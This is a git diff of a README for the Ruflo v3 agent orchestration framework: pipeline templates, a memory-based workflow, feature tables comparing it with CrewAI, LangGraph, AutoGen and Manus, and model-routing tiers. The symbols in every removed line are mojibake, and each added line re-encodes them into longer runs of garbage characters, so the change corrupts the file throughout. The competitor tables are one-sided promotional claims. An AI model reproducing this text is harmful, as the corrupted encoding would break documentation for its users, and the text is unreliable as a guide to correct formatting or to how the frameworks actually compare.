@@ -664,9 +664,9 @@ npx @claude-flow/codex dual run --template refactor --task "src/legacy/"
 
 | Template | Pipeline | Platforms |
 |----------|----------|-----------|
-| **feature** | architect Ã¢â€ â€™ coder Ã¢â€ â€™ tester Ã¢â€ â€™ reviewer | Claude + Codex |
-| **security** | scanner Ã¢â€ â€™ analyzer Ã¢â€ â€™ fixer | Codex + Claude |
-| **refactor** | analyzer Ã¢â€ â€™ planner Ã¢â€ â€™ refactorer Ã¢â€ â€™ validator | Claude + Codex |
+| **feature** | architect ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ coder ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ tester ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ reviewer | Claude + Codex |
+| **security** | scanner ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ analyzer ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ fixer | Codex + Claude |
+| **refactor** | analyzer ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ planner ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ refactorer ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ validator | Claude + Codex |
 
 ### MCP Integration for Codex
 
@@ -683,10 +683,10 @@ codex mcp add ruflo -- npx ruflo mcp start
 ### Self-Learning Workflow
 
 ```
-1. LEARN:   memory_search(query="task keywords") Ã¢â€ â€™ Find similar patterns
-2. COORD:   swarm_init(topology="hierarchical") Ã¢â€ â€™ Set up coordination
-3. EXECUTE: YOU write code, run commands       Ã¢â€ â€™ Codex does real work
-4. REMEMBER: memory_store(key, value, namespace="patterns") Ã¢â€ â€™ Save for future
+1. LEARN:   memory_search(query="task keywords") ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Find similar patterns
+2. COORD:   swarm_init(topology="hierarchical") ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Set up coordination
+3. EXECUTE: YOU write code, run commands       ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Codex does real work
+4. REMEMBER: memory_store(key, value, namespace="patterns") ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Save for future
 ```
 
 The **Intelligence Loop** (ADR-050) automates this cycle through hooks. Each session automatically:
@@ -783,91 +783,91 @@ Once added, Claude Code can use all 313 ruflo MCP tools directly:
 ## What is it exactly? Agents that learn, build and work perpetually. 
 
 <details>
-<summary>Ã°Å¸â€ Å¡ <strong>Why Ruflo v3?</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Â Ã…Â¡ <strong>Why Ruflo v3?</strong></summary>
 
 Ruflo v3 introduces **self-learning neural capabilities** that no other agent orchestration framework offers. While competitors require manual agent configuration and static routing, Ruflo learns from every task execution, prevents catastrophic forgetting of successful patterns, and intelligently routes work to specialized experts.
 
-#### Ã°Å¸Â§Â  Neural & Learning
+#### ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Neural & Learning
 
 | Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
 |---------|----------------|--------|-----------|---------|-------|
-| **Self-Learning** | Ã¢Å“â€¦ SONA + EWC++ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Prevents Forgetting** | Ã¢Å“â€¦ EWC++ consolidation | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Pattern Learning** | Ã¢Å“â€¦ From trajectories | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Expert Routing** | Ã¢Å“â€¦ MoE (8 experts) | Manual | Graph edges | Ã¢â€ºâ€ | Fixed |
-| **Attention Optimization** | Ã¢Å“â€¦ Flash Attention | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Low-Rank Adaptation** | Ã¢Å“â€¦ LoRA (low-rank adaptation) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
+| **Self-Learning** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ SONA + EWC++ | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Prevents Forgetting** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ EWC++ consolidation | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Pattern Learning** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ From trajectories | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Expert Routing** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ MoE (8 experts) | Manual | Graph edges | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | Fixed |
+| **Attention Optimization** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Flash Attention | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Low-Rank Adaptation** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ LoRA (low-rank adaptation) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
 
-#### Ã°Å¸â€™Â¾ Memory & Embeddings
-
-| Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
-|---------|----------------|--------|-----------|---------|-------|
-| **Vector Memory** | Ã¢Å“â€¦ HNSW (sub-ms search) | Ã¢â€ºâ€ | Via plugins | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Knowledge Graph** | Ã¢Å“â€¦ PageRank + communities | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Self-Learning Memory** | Ã¢Å“â€¦ LearningBridge (SONA) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Agent-Scoped Memory** | Ã¢Å“â€¦ 3-scope (project/local/user) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **PostgreSQL Vector DB** | Ã¢Å“â€¦ RuVector (77+ SQL functions) | Ã¢â€ºâ€ | pgvector only | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Hyperbolic Embeddings** | Ã¢Å“â€¦ PoincarÃƒÂ© ball (native + SQL) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Quantization** | Ã¢Å“â€¦ Int8 (~4x savings) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Persistent Memory** | Ã¢Å“â€¦ SQLite + AgentDB + PostgreSQL | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Limited |
-| **Cross-Session Context** | Ã¢Å“â€¦ Full restoration | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **GNN/Attention in SQL** | Ã¢Å“â€¦ 39 attention mechanisms | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-
-#### Ã°Å¸ÂÂ Swarm & Coordination
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ Memory & Embeddings
 
 | Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
 |---------|----------------|--------|-----------|---------|-------|
-| **Swarm Topologies** | Ã¢Å“â€¦ 4 types | 1 | 1 | 1 | 1 |
-| **Consensus Protocols** | Ã¢Å“â€¦ 5 (Raft, BFT, etc.) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Work Ownership** | Ã¢Å“â€¦ Claims system | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Background Workers** | Ã¢Å“â€¦ 12 auto-triggered | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Multi-Provider LLM** | Ã¢Å“â€¦ 6 with failover | 2 | 3 | 2 | 1 |
+| **Vector Memory** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ HNSW (sub-ms search) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | Via plugins | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Knowledge Graph** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ PageRank + communities | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Self-Learning Memory** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ LearningBridge (SONA) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Agent-Scoped Memory** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 3-scope (project/local/user) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **PostgreSQL Vector DB** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ RuVector (77+ SQL functions) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | pgvector only | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Hyperbolic Embeddings** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ PoincarÃƒÆ’Ã‚Â© ball (native + SQL) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Quantization** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Int8 (~4x savings) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Persistent Memory** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ SQLite + AgentDB + PostgreSQL | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | Limited |
+| **Cross-Session Context** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Full restoration | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **GNN/Attention in SQL** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 39 attention mechanisms | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
 
-#### Ã°Å¸â€Â§ Developer Experience
-
-| Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
-|---------|----------------|--------|-----------|---------|-------|
-| **MCP Integration** | Ã¢Å“â€¦ Native (313 tools) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Skills System** | Ã¢Å“â€¦ 42+ pre-built | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Limited |
-| **Stream Pipelines** | Ã¢Å“â€¦ JSON chains | Ã¢â€ºâ€ | Via code | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Pair Programming** | Ã¢Å“â€¦ Driver/Navigator | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Auto-Updates** | Ã¢Å“â€¦ With rollback | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-
-#### Ã°Å¸â€ºÂ¡Ã¯Â¸Â Security & Platform
+#### ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â Swarm & Coordination
 
 | Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
 |---------|----------------|--------|-----------|---------|-------|
-| **Threat Detection** | Ã¢Å“â€¦ AIDefence (<10ms) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Cloud Platform** | Ã¢Å“â€¦ Flow Nexus | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Code Transforms** | Ã¢Å“â€¦ Agent Booster (WASM) | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
-| **Input Validation** | Ã¢Å“â€¦ Zod + Path security | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ | Ã¢â€ºâ€ |
+| **Swarm Topologies** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 4 types | 1 | 1 | 1 | 1 |
+| **Consensus Protocols** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 5 (Raft, BFT, etc.) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Work Ownership** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Claims system | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Background Workers** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 12 auto-triggered | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Multi-Provider LLM** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 6 with failover | 2 | 3 | 2 | 1 |
+
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ Developer Experience
+
+| Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
+|---------|----------------|--------|-----------|---------|-------|
+| **MCP Integration** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Native (313 tools) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Skills System** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ 42+ pre-built | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | Limited |
+| **Stream Pipelines** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ JSON chains | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | Via code | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Pair Programming** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Driver/Navigator | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Auto-Updates** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ With rollback | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â Security & Platform
+
+| Feature | Ruflo v3 | CrewAI | LangGraph | AutoGen | Manus |
+|---------|----------------|--------|-----------|---------|-------|
+| **Threat Detection** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ AIDefence (<10ms) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Cloud Platform** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Flow Nexus | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Code Transforms** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Agent Booster (WASM) | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
+| **Input Validation** | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Zod + Path security | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â | ÃƒÂ¢Ã¢â‚¬ÂºÃ¢â‚¬Â |
 
 <sub>*Comparison updated February 2026. Feature availability based on public documentation.*</sub>
 
 </details>
 
 <details>
-<summary>Ã°Å¸Å¡â‚¬ <strong>Key Differentiators</strong> Ã¢â‚¬â€ Self-learning, memory optimization, fault tolerance</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â€šÂ¬ <strong>Key Differentiators</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Self-learning, memory optimization, fault tolerance</summary>
 
 What makes Ruflo different from other agent frameworks? These 10 capabilities work together to create a system that learns from experience, runs efficiently on any hardware, and keeps working even when things go wrong.
 
 | | Feature | What It Does | Technical Details |
 |---|---------|--------------|-------------------|
-| Ã°Å¸Â§Â  | **SONA** | Learns which agents perform best for each task type and routes work accordingly | Self-Optimizing Pattern Learning |
-| Ã°Å¸â€â€™ | **EWC++** | Preserves learned patterns when training on new ones Ã¢â‚¬â€ no forgetting | Elastic Weight Consolidation prevents catastrophic forgetting |
-| Ã°Å¸Å½Â¯ | **MoE** | Routes tasks through 8 specialized expert networks based on task type | Mixture of 8 Experts with dynamic gating |
-| Ã¢Å¡Â¡ | **Flash Attention** | Accelerates attention computation for faster agent responses | Optimized attention via @ruvector/attention |
-| Ã°Å¸Å’Â | **Hyperbolic Embeddings** | Represents hierarchical code relationships in compact vector space | Poincare ball model for hierarchical data |
-| Ã°Å¸â€œÂ¦ | **LoRA** | Lightweight model adaptation so agents fit in limited memory | Low-Rank Adaptation via @ruvector/sona |
-| Ã°Å¸â€”Å“Ã¯Â¸Â | **Int8 Quantization** | Converts 32-bit weights to 8-bit with minimal accuracy loss | ~4x memory reduction with calibrated integers |
-| Ã°Å¸Â¤Â | **Claims System** | Manages task ownership between humans and agents with handoff support | Work ownership with claim/release/handoff protocols |
-| Ã°Å¸â€ºÂ¡Ã¯Â¸Â | **Byzantine Consensus** | Coordinates agents even when some fail or return bad results | Fault-tolerant, handles up to 1/3 failing agents |
-| Ã°Å¸ÂËœ | **RuVector PostgreSQL** | Enterprise-grade vector database with 77+ SQL functions for AI operations | Fast vector search with GNN/attention in SQL |
+| ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  | **SONA** | Learns which agents perform best for each task type and routes work accordingly | Self-Optimizing Pattern Learning |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ | **EWC++** | Preserves learned patterns when training on new ones ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â no forgetting | Elastic Weight Consolidation prevents catastrophic forgetting |
+| ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ | **MoE** | Routes tasks through 8 specialized expert networks based on task type | Mixture of 8 Experts with dynamic gating |
+| ÃƒÂ¢Ã…Â¡Ã‚Â¡ | **Flash Attention** | Accelerates attention computation for faster agent responses | Optimized attention via @ruvector/attention |
+| ÃƒÂ°Ã…Â¸Ã…â€™Ã‚Â | **Hyperbolic Embeddings** | Represents hierarchical code relationships in compact vector space | Poincare ball model for hierarchical data |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ | **LoRA** | Lightweight model adaptation so agents fit in limited memory | Low-Rank Adaptation via @ruvector/sona |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬â€Ã…â€œÃƒÂ¯Ã‚Â¸Ã‚Â | **Int8 Quantization** | Converts 32-bit weights to 8-bit with minimal accuracy loss | ~4x memory reduction with calibrated integers |
+| ÃƒÂ°Ã…Â¸Ã‚Â¤Ã‚Â | **Claims System** | Manages task ownership between humans and agents with handoff support | Work ownership with claim/release/handoff protocols |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â | **Byzantine Consensus** | Coordinates agents even when some fail or return bad results | Fault-tolerant, handles up to 1/3 failing agents |
+| ÃƒÂ°Ã…Â¸Ã‚ÂÃ‹Å“ | **RuVector PostgreSQL** | Enterprise-grade vector database with 77+ SQL functions for AI operations | Fast vector search with GNN/attention in SQL |
 
 </details>
 
 <details>
-<summary>Ã°Å¸â€™Â° <strong>Intelligent 3-Tier Model Routing</strong> Ã¢â‚¬â€ Reduce API costs by routing simple tasks to cheaper models</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â° <strong>Intelligent 3-Tier Model Routing</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Reduce API costs by routing simple tasks to cheaper models</summary>
 
 Not every task needs the most powerful (and expensive) model. Ruflo analyzes each request and automatically routes it to the cheapest handler that can do the job well. Simple code transforms skip the LLM entirely using WebAssembly. Medium tasks use faster, cheaper models. Only complex architecture decisions use Opus.
 
@@ -875,16 +875,16 @@ Not every task needs the most powerful (and expensive) model. Ruflo analyzes eac
 
 | Benefit | Impact |
 |---------|--------|
-| Ã°Å¸â€™Âµ **API Cost Reduction** | 75% lower costs by using right-sized models |
-| Ã¢ÂÂ±Ã¯Â¸Â **Claude Max Extension** | More tasks within quota via smart model selection |
-| Ã°Å¸Å¡â‚¬ **Faster Simple Tasks** | <1ms for transforms vs 2-5s with LLM |
-| Ã°Å¸Å½Â¯ **Zero Wasted Tokens** | Simple edits use 0 tokens (WASM handles them) |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Âµ **API Cost Reduction** | 75% lower costs by using right-sized models |
+| ÃƒÂ¢Ã‚ÂÃ‚Â±ÃƒÂ¯Ã‚Â¸Ã‚Â **Claude Max Extension** | More tasks within quota via smart model selection |
+| ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â€šÂ¬ **Faster Simple Tasks** | <1ms for transforms vs 2-5s with LLM |
+| ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ **Zero Wasted Tokens** | Simple edits use 0 tokens (WASM handles them) |
 
 **Routing Tiers:**
 
 | Tier | Handler | Latency | Cost | Use Cases |
 |------|---------|---------|------|-----------|
-| **1** | Agent Booster (WASM) | <1ms | $0 | Simple transforms: varÃ¢â€ â€™const, add-types, remove-console |
+| **1** | Agent Booster (WASM) | <1ms | $0 | Simple transforms: varÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢const, add-types, remove-console |
 | **2** | Haiku/Sonnet | 500ms-2s | $0.0002-$0.003 | Bug fixes, refactoring, feature implementation |
 | **3** | Opus | 2-5s | $0.015 | Architecture, security design, distributed systems |
 
@@ -893,19 +893,19 @@ Not every task needs the most powerful (and expensive) model. Ruflo analyzes eac
 </details>
 
 <details>
-<summary>Ã°Å¸â€œâ€¹ <strong>Spec-Driven Development</strong> Ã¢â‚¬â€ Build complete specs, implement without drift</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Â¹ <strong>Spec-Driven Development</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Build complete specs, implement without drift</summary>
 
-Complex projects fail when implementation drifts from the original plan. Ruflo solves this with a spec-first approach: define your architecture through ADRs (Architecture Decision Records), organize code into DDD bounded contexts, and let the system enforce compliance as agents work. The result is implementations that match specifications Ã¢â‚¬â€ even across multi-agent swarms working in parallel.
+Complex projects fail when implementation drifts from the original plan. Ruflo solves this with a spec-first approach: define your architecture through ADRs (Architecture Decision Records), organize code into DDD bounded contexts, and let the system enforce compliance as agents work. The result is implementations that match specifications ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â even across multi-agent swarms working in parallel.
 
 **How It Prevents Drift:**
 
 | Capability | What It Does |
 |------------|--------------|
-| Ã°Å¸Å½Â¯ **Spec-First Planning** | Agents generate ADRs before writing code, capturing requirements and decisions |
-| Ã°Å¸â€Â **Real-Time Compliance** | Statusline shows ADR compliance %, catches deviations immediately |
-| Ã°Å¸Å¡Â§ **Bounded Contexts** | Each domain (Security, Memory, etc.) has clear boundaries agents can't cross |
-| Ã¢Å“â€¦ **Validation Gates** | `hooks progress` blocks merges that violate specifications |
-| Ã°Å¸â€â€ž **Living Documentation** | ADRs update automatically as requirements evolve |
+| ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ **Spec-First Planning** | Agents generate ADRs before writing code, capturing requirements and decisions |
+| ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â **Real-Time Compliance** | Statusline shows ADR compliance %, catches deviations immediately |
+| ÃƒÂ°Ã…Â¸Ã…Â¡Ã‚Â§ **Bounded Contexts** | Each domain (Security, Memory, etc.) has clear boundaries agents can't cross |
+| ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ **Validation Gates** | `hooks progress` blocks merges that violate specifications |
